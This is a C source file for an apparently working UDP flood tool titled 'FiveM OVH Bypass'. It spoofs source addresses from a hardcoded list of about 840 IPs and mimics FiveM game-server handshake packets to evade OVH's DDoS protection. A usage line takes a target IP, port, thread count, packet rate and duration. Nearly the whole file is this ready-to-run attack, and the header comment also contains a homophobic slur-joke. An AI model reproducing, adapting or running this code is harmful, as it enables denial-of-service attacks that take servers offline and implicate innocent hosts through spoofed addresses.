/* 
sex on the beach
so high quality c code that you will turn gay
by googleadmin
*/
#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/udp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netdb.h>
#include <net/if.h>
#include <arpa/inet.h>
#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9
static unsigned long int Q[4096], c = 362436;
static unsigned int floodport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;
void init_rand(unsigned long int x)
{
        int i;
        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;
        for (i = 3; i < 4096; i++){ Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i; }
}
unsigned long int rand_cmwc(void)
{
        unsigned long long int t, a = 18782LL;
        static unsigned long int i = 4095;
        unsigned long int x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (t >> 32);
        x = t + c;
        if (x < c) {
        x++;
        c++;
        }
        return (Q[i] = r - x);
}
int randnum(int min_num, int max_num)
{
    int result = 0, low_num = 0, hi_num = 0;

    if (min_num < max_num)
    {
        low_num = min_num;
        hi_num = max_num + 1; // include max_num in output
    } else {
        low_num = max_num + 1; // include max_num in output
        hi_num = min_num;
    }

//    srand(time(NULL)); we already have it initialized in init_rand, also OVH is a bitch and they recognize random numbers generated by time
    result = (rand_cmwc() % (hi_num - low_num)) + low_num;
    return result;
}
unsigned short csum (unsigned short *buf, int count)
{
        register unsigned long sum = 0;
        while( count > 1 ) { sum += *buf++; count -= 2; }
        if(count > 0) { sum += *(unsigned char *)buf; }
        while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
        return (unsigned short)(~sum);
}
unsigned short udpcsum(struct iphdr *iph, struct udphdr *udph, int pipisize) {
        struct udp_pseudo
        {
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
        } pseudohead;
        unsigned short total_len = iph->tot_len;
        pseudohead.src_addr=iph->saddr;
        pseudohead.dst_addr=iph->daddr;
        pseudohead.zero=0;
        pseudohead.proto=IPPROTO_UDP;
        pseudohead.length=htons(sizeof(struct udphdr) + pipisize);
        int totaludp_len = sizeof(struct udp_pseudo) + sizeof(struct udphdr) + pipisize;
        unsigned short *udp = malloc(totaludp_len);
        memcpy((unsigned char *)udp,&pseudohead,sizeof(struct udp_pseudo));
        memcpy((unsigned char *)udp+sizeof(struct udp_pseudo),(unsigned char *)udph,sizeof(struct udphdr) + pipisize);
        unsigned short output = csum(udp,totaludp_len);
        free(udp);
        return output;
}
void setup_ip_header(struct iphdr *iph)
{
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 6;
        iph->id = htonl(54321);
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = IPPROTO_UDP;
        iph->check = 0;
        iph->saddr = inet_addr("192.168.3.100");
}
void setup_udp_header(struct udphdr *udph)
{
        udph->dest = htons(floodport);
        udph->source = htons(5678);
        udph->check = 0;
        memcpy((void *)udph + sizeof(struct udphdr), "\x0f\x02\x11\x23\x9f\xdd\x10\x09\x33\xfe\x1f\x8f\xba\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xee\x31\x41\x00\x00\x41\x0f\x02\x11\x23\x9f\xdd\x10\x09\x33\xfe\x1f\x8f\xba\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xee\x31\x41\x00\x00\x41\x0f\x02\x11\x23\x9f\xdd\x10\x09\x33\xfe\x1f\x8f\xba\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xee\x31\x41\x00\x00\x41\x00\x00\x00\x00", 100);
        udph->len=htons(sizeof(struct udphdr) + 100);
}
void *flood(void *par1)
{
        char *td = (char *)par1;
        char datagram[MAX_PACKET_SIZE];
        struct iphdr *iph = (struct iphdr *)datagram;
        struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
        struct sockaddr_in sin;
        sin.sin_family = AF_INET;
        sin.sin_port = htons(floodport);
        sin.sin_addr.s_addr = inet_addr(td);
        int s = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
        if(s < 0){
        fprintf(stderr, "Could not open raw socket.\n");
        exit(-1);
        }
        memset(datagram, 0, MAX_PACKET_SIZE);
        setup_ip_header(iph);
        setup_udp_header(udph);
        udph->dest = htons(floodport);
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = csum ((unsigned short *) datagram, iph->tot_len);
        char fiveminfo[15] = "\xff\xff\xff\xff\x67\x65\x74\x69\x6e\x66\x6f\x20\x78\x79\x7a";//getinfo
        char fivesec[52] = "\x8f\xff\x90\x3c\x82\xff\x00\x01\x00\x00\xff\xff\x00\x00\x05\x14\x00\x01\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x88\x00\x00\x00\x02\x00\x00\x00\x02\x90\x3c\x5c\x16\x00\x00\x00\x00";
        char fivetoken[88] = "\x80\x00\x29\x5a\x01\xff\x00\x01\x00\x01\x83\xd6\x86\x00\x00\x01\x00\x46\x01\x00\x00\x00\x74\x6f\x6b\x65\x6e\x3d\x62\x31\x35\x33\x31\x36\x64\x63\x2d\x36\x63\x65\x39\x2d\x34\x62\x34\x32\x2d\x39\x31\x62\x35\x2d\x32\x36\x62\x65\x34\x37\x32\x32\x35\x63\x39\x38\x26\x67\x75\x69\x64\x3d\x31\x34\x38\x36\x31\x38\x37\x39\x32\x34\x35\x34\x33\x32\x30\x31\x31\x38";
        char fivem24var1[24] = "\x14\xf4\xd4\x8d\x73\x43\x90\x9c\xec\x33\xad\xd0\x48\x90\xbb\xb1\xa2\x2f\x7e\xda\xc4\xa5\x14\xb6";
        char fivem24var2[24] = "\x86\xb6\x06\x12\xf7\xf3\x17\xb4\xa5\x2a\x8d\xfb\x5e\xce\x92\x6d\xca\x1a\x34\x2a\xd1\xb8\xaf\xf7";
        int tmp = 1;
        const int *val = &tmp;
        if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
        fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
        exit(-1);
        }
        init_rand(time(NULL));
        register unsigned int i;
        register unsigned int ipkeep = 0;
        register unsigned int varientchoose;
        register unsigned int ipid;
        int okgotcha = 0;
        register unsigned int udpsource;
        const char *whitelistedips[840] = {"197.220.163.230", "162.158.75.191", "45.55.65.92", "213.34.171.254", "23.21.231.124", "52.5.208.118", "13.88.28.53", "51.158.171.117", "172.69.63.16", "162.158.203.46", "172.69.33.82", "162.142.125.67", "52.114.159.112", "104.16.122.5", "162.158.94.217", "12.218.209.130", "172.68.24.109", "104.200.31.26", "108.162.229.178", "162.158.75.253", "192.241.173.142", "108.162.192.106", "162.158.202.251", "94.130.186.249", "104.160.41.247", "104.248.159.69", "167.248.133.77", "108.162.229.204", "104.19.147.132", "162.159.137.234", "195.16.59.58", "167.248.133.71", "162.142.125.86", "162.158.75.131", "66.203.125.15", "74.120.14.55", "104.22.2.52", "162.142.125.73", "162.158.203.40", "141.101.68.50", "121.172.108.19", "172.69.63.42", "107.20.30.220", "167.248.133.78", "162.142.125.38", "162.142.125.19", "201.18.21.178", "35.173.69.86", "108.162.229.122", "104.21.7.118", "185.191.171.13", "185.191.171.36", "130.61.134.151", "67.207.88.180", "177.23.191.191", "172.69.63.92", "162.142.125.37", "189.240.117.236", "172.68.65.83", "162.142.125.40", "212.83.179.156", "104.21.24.38", "172.69.34.69", "187.33.235.50", "95.85.15.86", "23.21.252.4", "108.162.229.10", "188.114.111.157", "173.245.54.246", "170.84.224.240", "104.24.31.82", "138.201.175.200", "141.101.68.40", "172.67.178.47", "50.116.56.78", "167.248.133.95", "162.142.125.55", "162.243.42.225", "172.69.63.10", "52.114.75.79", "95.81.173.8", "92.84.56.10", "64.227.19.127", "66.165.247.154", "141.101.69.242", "141.101.69.179", "185.191.171.40", "91.189.89.199", "172.67.216.193", "42.200.109.74", "120.92.166.166", "66.249.66.50", "216.245.221.84", "162.158.62.120", "13.66.139.47", "193.138.129.205", "159.89.47.115", "103.4.235.204", "104.18.191.33", "205.251.197.115", "134.209.164.184", "162.158.89.100", "162.142.125.53", "20.54.110.119", "162.158.62.136", "198.143.164.251", "149.154.167.220", "108.162.229.138", "164.90.217.133", "190.107.22.162", "104.22.27.164", "173.245.52.164", "40.70.184.83", "206.189.122.115", "68.64.228.251", "129.204.203.218", "129.250.35.250", "162.142.125.71", "162.159.129.233", "141.101.68.20", "103.40.242.32", "173.245.52.206", "167.248.133.90", "185.191.171.8", "221.181.185.135", "78.25.69.228", "40.79.154.194", "128.199.195.239", "107.170.57.221", "141.101.69.220", "185.191.171.19", "162.158.88.247", "172.67.199.78", "172.69.63.26", "172.69.63.144", "185.191.171.1", "98.101.100.92", "141.101.104.188", "208.113.198.125", "167.248.133.53", "108.162.216.245", "162.158.166.193", "52.114.88.29", "52.114.128.69", "185.191.171.34", "194.59.207.238", "141.101.104.143", "185.191.171.44", "108.162.216.111", "66.203.125.11", "162.158.27.70", "108.162.216.105", "185.165.190.34", "108.162.229.228", "207.46.13.78", "42.192.127.194", "141.101.68.67", "141.101.76.61", "41.33.56.82", "167.248.133.66", "50.2.108.66", "172.67.179.188", "52.114.133.61", "80.28.153.238", "185.191.171.23", "186.24.218.195", "108.162.219.133", "142.250.74.234", "172.64.32.106", "92.51.72.10", "216.58.204.98", "172.69.63.34", "40.77.167.52", "94.182.176.136", "141.101.105.143", "104.18.0.89", "185.191.171.22", "162.142.125.90", "162.158.203.32", "162.158.203.30", "104.236.55.217", "172.69.63.128", "45.63.6.13", "74.125.140.188", "74.122.121.120", "82.65.27.68", "144.76.87.121", "108.162.229.244", "194.0.5.123", "82.165.99.18", "141.101.69.81", "173.245.52.68", "211.252.87.42", "172.68.65.125", "104.236.72.182", "172.68.141.195", "158.46.127.222", "129.250.35.251", "108.162.216.181", "128.199.143.19", "108.162.229.194", "69.162.124.234", "172.67.74.120", "95.211.244.57", "185.191.171.4", "209.244.0.3", "162.159.7.226", "162.158.165.116", "162.142.125.79", "64.225.75.212", "95.179.193.59", "91.189.94.173", "141.101.69.181", "209.126.1.80", "163.172.103.204", "167.71.209.158", "141.101.68.27", "138.91.136.108", "172.68.141.105", "93.174.95.106", "178.128.206.34", "141.101.105.108", "162.158.203.26", "162.158.203.27", "121.4.89.155", "172.68.65.101", "41.33.12.34", "185.220.101.130", "162.158.119.207", "46.4.121.51", "141.101.69.8", "40.77.167.49", "162.158.203.29", "119.28.49.192", "98.101.176.242", "190.109.168.241", "92.51.101.162", "162.142.125.24", "162.159.136.232", "185.191.171.16", "141.101.76.39", "162.158.165.231", "141.101.76.155", "108.162.216.119", "167.248.133.79", "128.199.143.157", "93.63.115.100", "162.158.202.173", "198.23.228.254", "159.203.182.105", "172.67.65.206", "190.124.30.202", "172.65.251.78", "185.191.171.18", "210.183.21.48", "108.162.229.139", "188.114.111.148", "134.122.72.221", "14.52.249.27", "141.101.69.53", "51.158.147.92", "78.47.152.192", "13.107.21.200", "221.181.185.143", "209.97.183.120", "162.158.202.174", "200.57.3.4", "46.246.93.113", "221.181.185.220", "162.158.165.180", "167.248.133.21", "42.123.99.67", "74.120.14.40", "139.162.145.250", "155.133.248.39", "167.248.133.75", "196.203.108.34", "165.22.73.254", "162.142.125.82", "93.184.221.240", "162.159.138.232", "188.166.79.172", "159.203.165.156", "141.101.77.171", "202.62.72.98", "111.229.95.77", "195.201.95.90", "106.75.119.13", "159.89.38.228", "216.58.204.106", "194.58.118.189", "141.101.69.51", "141.101.69.33", "162.158.165.222", "162.142.125.91", "207.46.13.108", "172.69.63.28", "208.68.39.220", "162.158.167.59", "104.236.69.31", "37.46.128.131", "159.65.139.163", "162.158.78.64", "66.203.125.13", "162.142.125.28", "141.101.105.115", "141.101.69.56", "27.128.173.81", "135.181.149.138", "181.49.176.37", "190.94.249.242", "162.158.111.96", "108.162.229.179", "162.159.135.233", "40.78.128.150", "141.101.76.86", "141.101.104.239", "141.101.96.183", "205.251.192.154", "108.162.219.79", "152.67.58.141", "83.96.6.210", "46.101.67.208", "94.102.49.193", "35.169.63.54", "13.66.139.43", "63.143.42.242", "172.68.65.99", "95.217.34.50", "185.191.171.14", "108.162.219.55", "206.189.63.155", "167.172.112.215", "104.21.81.125", "172.68.24.63", "192.3.201.65", "185.191.171.37", "185.191.171.38", "162.159.133.233", "162.158.74.214", "162.158.75.111", "162.159.130.233", "216.239.32.116", "172.69.63.32", "162.158.74.182", "129.226.150.149", "177.200.178.62", "66.175.208.209", "162.159.128.233", "108.162.229.39", "108.162.250.82", "95.81.173.74", "96.126.106.201", "35.186.205.6", "84.42.96.48", "207.180.192.205", "50.19.252.36", "162.142.125.78", "172.68.254.65", "114.119.151.59", "162.158.202.172", "172.69.63.88", "162.158.126.153", "116.203.40.77", "216.245.221.83", "13.107.5.93", "95.217.15.34", "52.114.75.78", "141.101.104.56", "162.142.125.70", "36.66.151.17", "212.51.181.242", "162.142.125.22", "54.165.239.170", "45.55.32.34", "167.248.133.55", "172.68.57.18", "108.162.229.68", "116.12.200.194", "162.142.125.30", "162.142.125.65", "103.105.130.136", "212.29.211.249", "162.158.202.247", "27.221.18.27", "46.99.133.165", "117.144.189.69", "104.21.70.55", "185.191.171.21", "108.61.78.150", "162.158.91.165", "108.162.229.221", "193.228.108.122", "141.101.69.46", "185.191.171.41", "152.136.17.25", "172.217.18.206", "92.46.124.194", "104.22.26.164", "108.162.229.71", "162.158.203.10", "183.136.225.45", "167.248.133.74", "162.158.90.4", "108.162.229.143", "202.111.192.18", "52.1.78.251", "13.89.202.241", "162.142.125.64", "94.250.251.72", "92.118.160.5", "149.28.50.248", "162.158.75.161", "162.159.136.234", "68.183.86.86", "95.81.173.155", "167.248.133.93", "49.12.45.220", "159.89.236.71", "143.110.190.26", "221.181.185.140", "162.142.125.87", "193.52.136.2", "46.4.121.9", "199.9.14.201", "92.45.61.74", "183.110.223.149", "167.248.133.18", "172.69.63.148", "172.67.69.96", "162.159.130.234", "189.203.233.206", "108.61.78.149", "40.77.167.22", "172.67.38.140", "167.71.13.196", "93.90.205.119", "162.158.74.98", "167.248.133.73", "141.101.69.69", "106.51.85.16", "114.4.227.194", "185.191.171.17", "108.162.216.107", "162.158.202.177", "187.93.112.34", "202.53.15.131", "185.191.171.43", "162.142.125.31", "52.23.120.125", "162.158.89.204", "195.201.249.154", "104.21.34.66", "185.191.171.15", "185.191.171.5", "162.158.166.199", "165.22.61.82", "61.155.167.4", "178.249.167.0", "35.185.241.102", "162.158.203.36", "185.191.171.42", "108.162.210.183", "162.158.166.163", "221.181.185.223", "103.220.76.197", "162.158.187.196", "172.68.65.151", "178.62.253.153", "13.66.139.2", "103.27.4.161", "162.158.203.6", "216.58.204.99", "92.118.160.61", "221.181.185.198", "108.162.229.51", "172.64.33.122", "179.190.99.242", "159.89.237.57", "82.80.41.234", "1.214.245.27", "172.69.63.51", "172.67.75.219", "162.158.203.23", "94.102.49.190", "162.159.137.232", "195.154.222.90", "162.142.125.77", "27.128.244.13", "193.0.14.129", "162.158.202.249", "5.8.10.202", "192.0.76.3", "185.191.171.6", "104.131.40.125", "167.248.133.24", "109.232.109.58", "203.34.117.5", "190.213.161.17", "162.158.203.8", "162.158.202.245", "36.91.51.221", "81.28.163.250", "185.191.171.35", "108.162.210.163", "167.248.133.91", "185.199.108.153", "52.114.132.47", "172.68.65.111", "154.120.230.250", "178.128.226.2", "162.158.63.99", "139.162.228.62", "167.248.133.67", "185.66.140.168", "94.233.32.26", "85.236.20.50", "52.207.41.187", "162.142.125.26", "162.159.135.234", "195.224.138.61", "162.158.203.24", "162.159.200.123", "162.142.125.29", "174.138.64.163", "104.16.174.56", "162.158.62.114", "162.14.23.147", "155.133.246.51", "162.142.125.68", "172.67.15.47", "108.162.229.89", "52.0.92.74", "138.201.173.70", "135.181.108.8", "167.248.133.23", "162.158.255.209", "104.18.14.60", "162.142.125.84", "74.120.14.56", "191.217.144.2", "172.68.25.112", "172.69.62.249", "23.100.232.233", "151.101.1.140", "159.89.172.207", "167.248.133.68", "172.217.19.227", "37.139.16.229", "162.158.89.203", "168.119.115.160", "108.162.216.103", "162.158.78.41", "45.135.203.22", "167.248.133.40", "141.101.105.129", "141.101.69.11", "220.196.1.142", "23.129.64.236", "162.142.125.18", "205.251.193.178", "192.241.246.167", "185.191.171.39", "185.51.214.156", "104.21.59.148", "162.142.125.88", "208.67.222.222", "82.66.249.102", "184.73.252.222", "167.248.133.88", "185.191.171.3", "141.101.69.108", "162.142.125.74", "185.26.182.111", "222.239.124.19", "198.211.121.90", "172.67.130.73", "35.186.224.47", "162.158.62.96", "80.82.70.118", "182.74.255.124", "162.159.130.235", "157.230.100.192", "93.185.67.74", "66.249.66.54", "162.159.134.234", "104.18.1.89", "223.100.167.105", "5.189.160.21", "104.23.98.190", "108.162.216.141", "172.67.164.186", "141.101.69.253", "201.20.42.129", "108.162.212.198", "82.165.68.22", "40.77.18.167", "141.101.68.41", "185.191.171.10", "151.139.128.14", "141.101.69.236", "206.189.181.12", "162.158.203.21", "167.248.133.89", "81.161.61.88", "108.162.229.102", "185.191.171.9", "108.162.219.145", "157.245.12.107", "154.14.78.198", "104.21.56.192", "104.18.190.33", "74.120.14.38", "104.22.3.52", "52.242.101.226", "104.26.10.89", "178.62.11.90", "62.213.14.73", "162.159.133.234", "162.158.74.158", "172.69.55.111", "162.158.75.141", "113.31.102.8", "138.197.17.201", "185.191.171.45", "141.101.69.25", "162.158.202.244", "188.114.110.17", "125.17.149.194", "188.114.110.167", "108.16.0.72", "68.183.234.51", "219.138.150.220", "172.64.33.118", "13.107.4.50", "5.189.188.23", "162.142.125.80", "167.99.231.236", "128.199.101.113", "141.101.104.189", "141.101.68.10", "198.59.53.9", "165.227.193.157", "155.133.248.38", "54.171.230.55", "185.191.171.33", "162.158.203.45", "162.159.134.233", "162.158.166.97", "117.200.55.124", "162.142.125.83", "167.99.66.2", "85.62.33.201", "52.114.32.24", "221.181.185.19", "144.34.240.47", "162.158.203.14", "211.103.13.101", "185.191.171.25", "167.248.133.38", "187.5.109.187", "141.101.105.86", "66.240.192.138", "173.245.52.168", "198.199.65.28", "162.243.41.44", "185.181.102.18", "104.21.72.32", "108.162.229.44", "217.168.75.75", "185.191.171.7", "108.162.216.254", "49.12.46.85", "82.200.65.218", "172.67.220.157", "168.187.86.33", "172.68.65.84", "162.142.125.76", "167.71.96.148", "162.142.125.85", "112.166.133.216", "78.46.247.95", "52.114.132.22", "104.19.146.132", "162.158.165.50", "162.159.200.1", "112.196.26.203", "108.162.193.122", "40.77.167.16", "108.162.229.58", "138.68.72.167", "162.158.92.85", "106.75.24.157", "162.142.125.27", "159.89.53.183", "104.18.15.60", "172.68.132.166", "208.74.123.178", "162.158.75.119", "167.248.133.70", "162.142.125.92", "189.89.155.68", "157.230.38.102", "172.67.160.227", "104.21.9.85", "54.235.83.248", "88.98.232.53", "162.158.203.28", "66.57.151.234", "87.241.1.186", "173.194.76.188", "162.142.125.17", "185.191.171.2", "167.248.133.54", "185.191.171.26", "167.248.133.20", "91.189.89.198", "183.111.148.118", "199.182.221.110", "172.68.65.117", "141.101.96.75", "172.217.22.131", "66.228.34.58", "66.203.125.56", "185.191.171.11", "162.142.125.25", "46.23.155.114", "195.154.174.209", "162.158.255.153", "91.189.91.157", "172.68.132.70", "62.210.206.214", "178.62.108.111", "74.120.14.16", "162.142.125.20", "108.162.210.127", "190.156.231.245", "104.236.5.8", "82.81.169.209", "108.162.219.7", "110.49.53.18", "199.253.249.53", "194.135.87.240", "162.158.63.63", "162.158.202.241", "172.68.25.154", "175.138.108.78", "200.48.72.193", "52.114.77.33", "162.142.125.72", "64.227.13.158", "162.158.79.12", "104.21.35.179", "162.158.75.71", "167.248.133.56", "167.248.133.84", "167.248.133.25", "208.95.112.1", "172.67.155.207", "46.101.143.148", "168.62.58.130", "50.28.37.175", "71.6.165.200", "141.101.76.51", "202.153.37.194", "141.101.104.212", "162.159.135.232", "95.216.23.42", "51.15.191.239", "52.114.132.73", "162.158.203.42", "202.179.185.130", "104.26.11.89", "167.248.133.92", "159.65.137.122", "167.248.133.17", "172.67.73.214", "51.15.175.180", "167.248.133.72", "52.56.73.124", "62.109.17.7", "74.120.14.87", "157.245.103.203", "162.158.203.44", "172.68.25.29", "162.158.75.87", "54.214.105.212", "182.61.21.209", "136.243.102.205", "162.158.203.22", "125.20.3.138", "122.165.247.254", "108.162.216.125", "74.120.14.81", "195.70.60.100", "52.114.128.70", "124.160.96.249", "162.142.125.21", "141.101.96.180", "172.69.63.82", "147.139.163.83", "172.67.174.103", "162.158.202.176", "162.142.125.75", "172.69.34.159", "106.12.167.146", "141.101.76.161", "119.29.237.201", "185.191.171.20", "186.4.94.157", "40.125.122.176", "167.71.74.221", "192.5.5.241", "212.156.51.134", "108.162.229.166", "167.248.133.19", "23.36.87.113", "161.35.6.188", "51.105.5.16", "41.139.133.163", "167.248.133.69", "51.15.177.17", "98.142.143.152", "65.204.25.2", "93.63.115.100", "39.179.131.127", "223.80.115.187", "223.80.132.243", "113.194.140.253", "113.194.138.241", "113.194.141.193", "171.35.168.241", "171.35.166.86", "113.194.141.196", "113.194.130.48", "223.80.121.171", "113.194.132.51", "171.35.162.65", "113.194.136.221", "113.195.163.83"};
        
        i = 0;
        while(1){
        if(ipkeep == 0){
            varientchoose = randnum(1,2);
            //iph->saddr = rand_cmwc() & 0xFFFFFFFF;
            iph->saddr = inet_addr(whitelistedips[rand_cmwc()%839]);
            iph->ttl = rand() % 60 + 100;
            ipid = randnum(0, 65535);
            udpsource = randnum(0, 65535);
            iph->id = htons(ipid);
            udph->source = udpsource;
            ipkeep++;
        }
        if(ipkeep == 1){
            iph->id = htons(ipid += 1);
            okgotcha = sizeof(fiveminfo);
            memcpy((void *)udph + sizeof(struct udphdr), fiveminfo, okgotcha);
            iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + okgotcha;
            udph->len=htons(sizeof(struct udphdr) + okgotcha);
            
            iph->check = 0;
            iph->check = csum ((unsigned short *) datagram, iph->tot_len);
            udph->check = 0;
            udph->source = rand_cmwc() & 0xFFFF;
            udph->source = udpsource;
            udph->check = udpcsum(iph, udph, okgotcha);
            sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
            ipkeep++;
            ipkeep++;
        }
        if(ipkeep == 3){
            iph->id = htons(ipid += 1);
            okgotcha = sizeof(fivesec);
            fivesec[2] = randnum(0,127);
            fivesec[3] = randnum(0,127);
            fivesec[44] = randnum(0,127);
            fivesec[45] = randnum(0,127);
            fivesec[46] = randnum(0,127);
            fivesec[47] = randnum(0,127);
            memcpy((void *)udph + sizeof(struct udphdr), fivesec, okgotcha);
            iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + okgotcha;
            udph->len=htons(sizeof(struct udphdr) + okgotcha);
            
            iph->check = 0;
            iph->check = csum ((unsigned short *) datagram, iph->tot_len);
            udph->check = 0;
            udph->source = rand_cmwc() & 0xFFFF;
            udph->source = udpsource;
            udph->check = udpcsum(iph, udph, okgotcha);
            sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
            ipkeep++;
        }
        if(ipkeep == 4){
            iph->id = htons(ipid += 1);
            okgotcha = sizeof(fivetoken);
            fivetoken[28] = randnum(97, 122);
            for(int i = 29; i <= 33; i++){
                fivetoken[i] = randnum(48, 57);
            }
            fivetoken[34] = randnum(97, 122);
            fivetoken[35] = randnum(97, 122);
            fivetoken[37] = randnum(48, 57);
            fivetoken[38] = randnum(97, 122);
            fivetoken[39] = randnum(97, 122);
            fivetoken[40] = randnum(48, 57);
            fivetoken[42] = randnum(48, 57);
            fivetoken[43] = randnum(97, 122);
            fivetoken[44] = randnum(48, 57);
            fivetoken[45] = randnum(48, 57);
            fivetoken[47] = randnum(48, 57);
            fivetoken[48] = randnum(48, 57);
            fivetoken[49] = randnum(97, 122);
            fivetoken[50] = randnum(48, 57);
            fivetoken[52] = randnum(48, 57);
            fivetoken[53] = randnum(48, 57);
            fivetoken[54] = randnum(97, 122);
            fivetoken[55] = randnum(97, 122);
            for(int i = 56; i <= 60; i++){
                fivetoken[i] = randnum(48, 57);
            }
            fivetoken[61] = randnum(97, 122);
            fivetoken[62] = randnum(48, 57);
            fivetoken[63] = randnum(48, 57);
            for(int i = 70; i <= 87; i++){
                fivetoken[i] = randnum(48, 57);
            }//generating new token
            memcpy((void *)udph + sizeof(struct udphdr), fivetoken, okgotcha);
            iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + okgotcha;
            udph->len=htons(sizeof(struct udphdr) + okgotcha);
            
            iph->check = 0;
            iph->check = csum ((unsigned short *) datagram, iph->tot_len);
            udph->check = 0;
            udph->source = rand_cmwc() & 0xFFFF;
            udph->source = udpsource;
            udph->check = udpcsum(iph, udph, okgotcha);
            sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
            ipkeep++;
        }
        if(ipkeep == 5){
            if(varientchoose == 1){
            iph->id = htons(ipid += 1);
            okgotcha = sizeof(fivem24var1);
            memcpy((void *)udph + sizeof(struct udphdr), fivem24var1, okgotcha);
            iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + okgotcha;
            udph->len=htons(sizeof(struct udphdr) + okgotcha);
            
            iph->check = 0;
            iph->check = csum ((unsigned short *) datagram, iph->tot_len);
            udph->check = 0;
            udph->source = rand_cmwc() & 0xFFFF;
            udph->source = udpsource;
            udph->check = udpcsum(iph, udph, okgotcha);
            sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
            ipkeep = 0;   
            }
            if(varientchoose == 2){
            iph->id = htons(ipid += 1);
            okgotcha = sizeof(fivem24var2);
            memcpy((void *)udph + sizeof(struct udphdr), fivem24var2, okgotcha);
            iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + okgotcha;
            udph->len=htons(sizeof(struct udphdr) + okgotcha);
            
            iph->check = 0;
            iph->check = csum ((unsigned short *) datagram, iph->tot_len);
            udph->check = 0;
            udph->source = rand_cmwc() & 0xFFFF;
            udph->source = udpsource;
            udph->check = udpcsum(iph, udph, okgotcha);
            sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
            ipkeep = 0;   
            }
        }
        pps++;
        if(i >= limiter)
        {
        i = 0;
        usleep(sleeptime);
        }
        i++;
        }
}
int main(int argc, char *argv[ ])
{
        if(argc < 6){
        fprintf(stderr, "\nFiveM OVH Bypass, made by googleadmin\n");
        fprintf(stderr, "\nrecommended pps is between 20000 and 80000\n");
        fprintf(stderr, "going higher than that could cause that whitelisted ips getting banned\n");
        fprintf(stdout, "\nUsage: %s <target ip> <port> <threads> <pps, -1 for no limit> <time>\n\n", argv[0]);
        exit(-1);
        }
        fprintf(stdout, "preparing flood...\n");
        int num_threads = atoi(argv[3]);
        floodport = atoi(argv[2]);
        int maxpps = atoi(argv[4]);
        limiter = 0;
        pps = 0;
        pthread_t thread[num_threads];
        int multiplier = 20;
        int i;
        for(i = 0;i<num_threads;i++){
        pthread_create( &thread[i], NULL, &flood, (void *)argv[1]);
        }
        fprintf(stdout, "starting flood...\n");
        for(i = 0;i<(atoi(argv[5])*multiplier);i++)
        {
        usleep((1000/multiplier)*1000);
        if((pps*multiplier) > maxpps)
        {
        if(1 > limiter)
        {
        sleeptime+=100;
        } else {
        limiter--;
        }
        } else {
        limiter++;
        if(sleeptime > 25)
        {
        sleeptime-=25;
        } else {
        sleeptime = 0;
        }
        }
        pps = 0;
        }
        return 0;
}